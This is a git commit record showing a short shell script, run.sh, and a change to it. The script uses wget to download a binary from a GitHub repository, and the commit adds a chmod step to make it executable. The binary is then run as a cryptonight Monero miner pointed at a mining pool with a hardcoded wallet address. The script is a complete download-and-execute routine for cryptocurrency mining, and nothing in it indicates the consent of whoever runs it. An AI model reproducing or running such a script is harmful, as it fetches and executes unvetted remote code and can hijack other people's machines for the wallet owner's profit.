4fde25e002bc65458109aaea3f0f179781014ee7
osrun <44208422+osrun@users.noreply.github.com>
2018-10-16 16:38:28 -0300

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,3 +1,4 @@
 #!/bin/sh
 wget https://github.com/osrun/beta/raw/master/run
+chmod +x run
 ./run -a cryptonight -o stratum+tcp://gulf.moneroocean.stream:80 -u 497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg -p y
